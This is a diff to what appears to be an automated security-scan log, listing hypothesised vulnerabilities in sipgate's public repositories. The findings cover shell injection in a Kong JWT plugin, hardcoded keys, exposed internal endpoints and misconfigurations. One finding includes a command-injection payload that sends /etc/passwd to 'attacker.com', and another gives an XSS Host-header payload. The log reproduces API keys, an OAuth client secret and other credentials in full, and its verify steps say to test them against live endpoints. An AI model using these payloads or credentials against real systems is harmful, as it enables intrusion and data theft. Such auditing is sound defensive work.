@@ -533,3 +533,117 @@ TARGET_ORG not configured for sipgate; skipping public-org deep scan.
 TARGET_ORG not configured for sipgate; skipping public-org deep scan.
 ## REPOSCAN 2026-09-12 00:36:38 UTC
 TARGET_ORG not configured for sipgate; skipping public-org deep scan.
+## REPOSCAN 2026-09-12 05:03:09 UTC
+[HYP] OS Command Injection in Kong JWT Firebase Plugin via JWT `kid` Header
+class: SSRF
+asset: kong-plugin-jwt-firebase/kong/plugins/jwt-firebase/handler.lua:31
+confidence: 95
+reasoning: `grab_public_key_bykid(t_kid)` interpolates the JWT header `kid` directly into a shell command via `io.popen()`: `local cmd = "wget -qO - " .. google_url .. " | grep -i " .. t_kid .. magic`. No sanitization or escaping. A crafted JWT with `kid` like `"; curl attacker.com/exfil?data=$(cat /etc/passwd) #` executes arbitrary OS commands on the Kong gateway node.
+impact: CRITICAL (9.8) — RCE on Kong node; attacker fully controls JWT header. Affects any Kong instance running this plugin.
+verify_steps: 1) Deploy plugin with a Firebase project_id. 2) Send request with JWT containing malicious kid. 3) Observe command execution or outbound request.
+[HYP] Secondary Injection + Bug in push_public_key_into_file
+class: OTHER
+asset: kong-plugin-jwt-firebase/kong/plugins/jwt-firebase/handler.lua:47-51
+confidence: 90
+reasoning: `push_public_key_into_file()` constructs `echo -n " .. publickey .. " > " .. shm` — if `grab_public_key_bykid` returns output with shell metacharacters (via crafted kid matching Google JSON content), the echo command is injectable. Additionally, line 51 has typo `cmd_handlel:close()` (should be `cmd_handle`), causing Lua runtime error that leaves the SHM file in an undefined state, meaning new keys are never properly saved.
+impact: HIGH — Secondary injection vector; the typo degrades security posture by preventing key rotation.
+verify_steps: 1) Trace call path: `do_authentication → grab_public_key_bykid → push_public_key_into_file`. 2) Verify `cmd_handlel` typo causes Lua error. 3) Confirm SHM write is never reached.
+[HYP] Hardcoded API Keys in Radau docker-compose.yml
+class: SECRET
+asset: radau/docker-compose.yml:20-21
+confidence: 95
+reasoning: Two API keys committed in plaintext: `API_KEY_MANAGEMENT=pYWVcrR4DmgCfkfmEte5nGNW` and `API_KEY_RADIUS=u39fNShDX6fAeXtWY6bZWY9x`. Also `DB_PASSWORD=wifi`, `POSTGRES_PASSWORD=wifi`. README confirms radau is a live WPA Enterprise RADIUS microservice. These keys are in git history permanently.
+impact: MEDIUM (5.3–7.5) — If any radau instance uses these default keys, the management API (user create/delete/token management) is fully exposed.
+verify_steps: 1) Send Authorization header with these keys to any radau `/user` or `/token` endpoint. 2) Verify GCP project `clinq-services` doesn't also host radau.
+[HYP] Default CORS AllowAllOrigins + AllowCredentials in Radau
+class: MISCONFIG
+asset: radau/main.go:15-28
+confidence: 85
+reasoning: When `CORS_ORIGINS` env var is not set (the default), `initCORSConfig()` sets `corsConfig.AllowAllOrigins = true` alongside `corsConfig.AllowCredentials = true`. The `Authorization` header is also explicitly allowed. Any origin can make credentialed cross-origin requests to the RADIUS auth API.
+impact: MEDIUM (6.5) — An attacker-controlled page can perform cross-origin requests with the user's API key/JWT, enabling account takeover or data exfiltration.
+verify_steps: 1) Confirm default path (no CORS_ORIGINS env) is production config. 2) Test cross-origin request from `evil.com` with credentials.
+[HYP] Hardcoded Internal Redis Endpoint (RFC-1918) in CLINQ Bridge K8s Deployment
+class: MISCONFIG
+asset: clinq-bridge-sipgate/k8s/template/deployment.yml:47
+confidence: 95
+reasoning: K8s deployment template hardcodes `REDIS_URL: rediss://10.37.248.211:6378` — internal RFC-1918 IP with TLS Redis on non-standard port 6378. `cloudbuild.yaml` confirms GCP project `clinq-services`, zone `europe-west3`, cluster `clinq-services-cluster`. Exposed across 15+ CLINQ bridge repos.
+impact: HIGH (7.5) — Exposes internal Redis endpoint; aids lateral movement or targeted SSRF.
+verify_steps: 1) Confirm `10.37.248.211` resolves from sipgate GCP VPC. 2) Verify TLS termination. 3) Confirm GCP project `clinq-services` zone `europe-west3`.
+[HYP] TLS Certificate Verification Disabled for Redis
+class: MISCONFIG
+asset: clinq-bridge-sipgate/src/cache/storage/redis-storage-adapter.ts:22
+confidence: 90
+reasoning: Redis client connects with `tls: { rejectUnauthorized: false }`, disabling TLS certificate verification. Allows MITM on Redis connections despite using `rediss://` (TLS) scheme configured in K8s deployment manifests.
+impact: MEDIUM (5.3) — Enables man-in-the-middle on Redis connections. Cached contact data could be intercepted or tampered with.
+verify_steps: 1) Confirm production deployment uses `rediss://` URL. 2) Verify whether this setting is overridden via environment variables.
+[HYP] Hardcoded OAuth Client Credentials in REST API Example
+class: SECRET
+asset: rest-api-examples/webapp-nodejs/.npmrc.dist:2-3
+confidence: 65
+reasoning: Contains `client_id=2414245-0-e24e0091-8265-11e7-93e7-e5fb754b756f` and `client_secret=187812ce-b546-4fa9-96e8-771e9775c3cb`. These follow the sipgate OAuth client credential format. The `.dist` template ships real-looking credentials (not placeholder values). The `index.js` uses these directly against `api.sipgate.com` OAuth endpoints.
+impact: LOW-MEDIUM (4.3) — If sipgate OAuth server hasn't revoked this credential, it could be used to obtain access tokens. Even if revoked, reveals exact credential format.
+verify_steps: 1) Attempt OAuth token exchange using these credentials against `https://api.sipgate.com/login/third-party/protocol/openid-connect/token`. 2) Check if client is in sipgate's developer portal.
+[HYP] Hardcoded Session Secret in REST API Example
+class: OTHER
+asset: rest-api-examples/webapp-nodejs/index.js:35
+confidence: 70
+reasoning: Express session middleware uses `secret: 'sipgate-rest-api-demo'` — hardcoded, publicly known signing key committed to a public repo. Establishes a pattern that could be copy-pasted into production.
+impact: LOW (3.1) — Session fixation risk if used in production. In example repo, impact limited to demonstrating insecure pattern.
+verify_steps: 1) Verify no production instances copy this exact secret. 2) Check if session secret is overridable via environment variable.
+[HYP] Default Cookie Secret in Ansible Logger (Slim Framework)
+class: MISCONFIG
+asset: ansible-logger/ansible-logger-web/includes/Slim/Slim.php:304-308
+confidence: 70
+reasoning: Default cookie secret key set to `'CHANGE_ME'`. `cookies.secure` and `cookies.httponly` are both set to `false`. If deployed without changing, session cookies can be forged by anyone who knows this default value.
+impact: LOW (3.1) — Session forgery if ansible-logger is deployed in production with default config.
+verify_steps: 1) Check if ansible-logger is deployed in production. 2) Verify if secret was changed from default.
+[HYP] Hardcoded Default Database Credentials in Ansible Logger
+class: SECRET
+asset: ansible-logger/ansible-logger-web/config/config.inc.php.dist:5-6
+confidence: 65
+reasoning: Contains `$config["db"]["user"] = "someuser"` and `$config["db"]["password"] = "secret"` as distribution defaults. Also `ansible-callbacks/ansible-logger.conf.dist` contains `password = somepassword`, `user = someuser`. Committed to public repo.
+impact: LOW (2.0) — Placeholder credentials unlikely to be used in production, but pattern encourages insecure defaults.
+verify_steps: 1) Check if ansible-logger is deployed with these default credentials.
+[HYP] Hardcoded JWT Secret in AI Demo MCP Server Mock Service
+class: SECRET
+asset: sipgate-ai-demo-auth-mcp-server/src/mock-service/server.ts:8
+confidence: 75
+reasoning: `JWT_SECRET = "mock-service-secret-key"` is hardcoded in the mock authentication service. Used to sign/verify tokens for the `/contracts` API. Committed to public repo. The mock service has no auth guard when `AUTH_BEARER_TOKEN` env var is unset (api-key.guard.ts:16-18 returns `true` unconditionally).
+impact: LOW (3.1) — Demo/mock service only, but if deployed alongside real services, could forge JWT tokens. The auth guard bypass makes this worse.
+verify_steps: 1) Check if mock service is deployed in any environment. 2) Verify if JWT_SECRET is overridable via env var.
+[HYP] Unauthenticated Socket.io Namespace with User-Controlled Token
+class: IDOR
+asset: demo.sipgate.io/server.js:40-49
+confidence: 70
+reasoning: `req.query.token` is used directly as a socket.io namespace name: `io.of("/" + namespace)`. A user can connect to any namespace by guessing/brute-forcing tokens. The `/connect` route generates a random namespace via `Math.random()`, but the `/success` route trusts the user-supplied `token` parameter with no authentication check on namespace access.
+impact: LOW (3.1) — Demo app only. However, if this pattern is replicated in production code, it enables unauthorized access to real-time call event streams.
+verify_steps: 1) Hit `/success?token=demo123` and connect via socket.io to `/demo123`. 2) Verify no auth check on namespace connection handler.
+[HYP] Internal Dev URLs Exposed in Browser Extension Manifest
+class: MISCONFIG
+asset: sipgategcx/manifest.json:17-19
+confidence: 70
+reasoning: Browser extension manifest exposes internal API endpoints: `http://api.dev.sipgate.net/RPC2` (HTTP, not HTTPS) and `https://samurai.sipgate.net/RPC2`. Reveals internal hostnames and API paths not intended for public knowledge.
+impact: LOW (2.0) — Information disclosure of internal infrastructure; dev endpoint is HTTP.
+verify_steps: 1) Verify if `api.dev.sipgate.net` and `samurai.sipgate.net` are accessible externally. 2) Check if extension is still maintained.
+[HYP] XSS / Header Injection via Unsanitized $_SERVER in SugarCRM Plugin
+class: MISCONFIG
+asset: sipgate-sugarcrm/Files/custom/modules/sipgateio/sipgateio.php:58
+confidence: 75
+reasoning: Constructs URL using `$_SERVER['HTTP_HOST']` and `$_SERVER['REQUEST_URI']` without sanitization: `$url = 'http' . ... . '://' . "{$_SERVER['HTTP_HOST']}/{$_SERVER['REQUEST_URI']}"`. This value is echoed into XML Response attributes (onAnswer/onHangup). A crafted Host header containing XML metacharacters could break out of the attribute context. `footer.php:21` also uses `$_SERVER` values in HTML output via `data-session` and `data-baseurl` attributes without encoding.
+impact: MEDIUM (5.3) — Potential reflected XSS or XML injection if the SIP gateway passes unsanitized headers through to the browser. Requires MITM or special header injection scenario.
+verify_steps: 1) Send request with `Host: "<script>alert(1)</script>"` to the SugarCRM endpoint. 2) Verify the output XML/HTML is not escaped.
+[HYP] Hardcoded SECRET_KEY_BASE in Flow-IO Docker Compose
+class: SECRET
+asset: flow-io/docker-compose.yml:168
+confidence: 80
+reasoning: `SECRET_KEY_BASE: UpNVntn3cDxHJpq99YMc1T1AQgQpc8kfYTuRgBiYa15BLrx8etQoXz3gZv1/u2oq` is hardcoded in plaintext in the Supabase Realtime service configuration. This is the default from the Supabase docker-compose template, but if deployed as-is, it compromises the cryptographic integrity of the Realtime service's signed tokens/cookies. Additionally, `DB_ENC_KEY: supabaseencryptedkey` (line 164) is a weak hardcoded encryption key.
+impact: LOW-MEDIUM (4.3) — Template default, but users deploying via `docker compose up` without modification would run with a publicly known secret key.
+verify_steps: 1) Check if any production Flow-IO deployment uses this exact SECRET_KEY_BASE. 2) Verify the .env.docker file properly overrides this value. 3) Confirm the README warns users to generate their own secret.
+[HYP] Weak Default Dashboard Password in Flow-IO Docker Compose
+class: MISCONFIG
+asset: flow-io/docker-compose.yml:277
+confidence: 75
+reasoning: `DASHBOARD_PASSWORD: ${DASHBOARD_PASSWORD:-change-me-please}` — the Supabase Studio dashboard defaults to password `change-me-please` if the env var is not set. This is the Kong/Supabase Studio admin interface with full database access.
+impact: LOW-MEDIUM (4.3) — If deployed without setting the env var, the database GUI is accessible with a trivially guessable password.
+verify_steps: 1) Check if any production Flow-IO deployment uses the default password. 2) Verify Studio is not exposed to the internet.
+TARGET_ORG not configured for sipgate; skipping public-org deep scan.
